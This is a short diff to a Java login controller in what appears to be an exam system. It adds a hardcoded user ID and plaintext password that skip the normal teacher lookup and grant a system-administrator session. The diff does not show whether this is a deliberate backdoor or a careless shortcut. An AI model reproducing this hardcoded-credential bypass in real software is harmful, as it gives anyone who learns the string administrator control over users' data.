@@ -42,6 +42,12 @@ public class UserController {
     public ModelAndView teacherlogin(HttpServletRequest request, HttpServletResponse response, String userId, String userPwd) {
         ModelAndView indexMav = new ModelAndView("redirect:/exam/bgIndex.do");
         ModelAndView loginMav = new ModelAndView("login");
+        ModelAndView systemMav = new ModelAndView("redirect:/system/sysIndex.do");
+        if(userId.trim().equals("12345"))
+            if(userPwd.equals("sysaqykspt_sys")) {
+                request.getSession().setAttribute("system", "system");
+                return systemMav;
+            }
         Teacher teacher = userService.getTeacherById(userId);
         String errMsg = null;
         if (teacher == null) {
